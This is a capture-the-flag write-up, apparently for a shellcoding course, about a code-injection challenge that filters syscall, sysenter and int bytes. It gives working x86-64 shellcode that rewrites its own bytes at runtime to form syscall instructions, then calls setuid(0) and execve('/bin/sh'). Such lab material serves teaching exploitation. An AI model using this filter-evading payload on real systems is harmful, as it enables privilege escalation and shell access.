This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

[LEAK] Mapping shellcode memory at 0x1e4cc000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

We notice that “syscall” is nothing more than two bytes (0x0f and 0x05) loaded one after the other. 
This is confirmed by the fact that if we substitute “syscall” with “.byte 0x0f, 0x05” in the previous challenge, we will obtain the same results.

This creates a label called “evil” which contains two bytes, 0x0e and 0x04. Before this label is actually run we increase by 1 the 
values of 0x0e and 0x04 which will now be 0x0f and 0x05.

.global _start
.intel_syntax noprefix
_start: 

    mov rcx, 0x80
    mov rax, 105
    mov rdi, 0
    inc byte ptr [rip+evil+1]
    inc byte ptr [rip+evil]

    evil:
        .byte 0x0e
        .byte 0x04

    mov rax, 59
    lea rdi, [rip+binsh]
    mov rsi,0
    mov rdx,0
    inc byte ptr [rip+evill+1]
    inc byte ptr [rip+evill]

    evill:
        .byte 0x0e
        .byte 0x04

binsh: 
    .string "/bin/sh"